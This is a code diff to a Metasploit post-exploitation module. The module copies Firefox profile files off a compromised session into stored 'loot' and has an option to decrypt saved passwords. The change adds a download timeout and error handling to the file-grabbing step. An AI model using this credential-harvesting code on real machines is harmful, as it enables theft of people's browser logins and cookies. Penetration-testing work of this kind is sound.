@@ -58,15 +58,13 @@ class Metasploit3 < Msf::Post
     ))
 
     register_options([
-      OptBool.new('DECRYPT',
-        [false, 'Decrypts passwords without third party tools', false])
+      OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
     ], self.class)
 
     register_advanced_options([
-      OptBool.new('DISCLAIMER',
-        [false, 'Acknowledge the DECRYPT warning', false]),
-      OptBool.new('RECOVER',
-        [false, 'Attempt to recover from bad DECRYPT when possible', false])
+      OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),
+      OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),
+      OptBool.new('RECOVER',  [false, 'Attempt to recover from bad DECRYPT when possible', false])
     ], self.class)
   end
 
@@ -343,11 +341,16 @@ class Metasploit3 < Msf::Post
           if @platform == :windows
             p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
             session.fs.file.download_file(p, path + "\\" + file)
+            print_good("Downloaded #{file}: #{p.to_s}")
           else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
-            loot = cmd_exec("cat #{path}//#{file}")
-            p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+            loot = cmd_exec("cat #{path}//#{file}", nil, datastore['DOWNLOAD_TIMEOUT'])
+            if loot.nil? || loot.empty?
+              print_error("Failed to download #{file}, if the file is very long, try increasing DOWNLOAD_TIMEOUT")
+            else
+              p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+              print_good("Downloaded #{file}: #{p.to_s}")
+            end
           end
-          print_good("Downloaded #{file}: #{p.to_s}")
         end
       end
       print_line
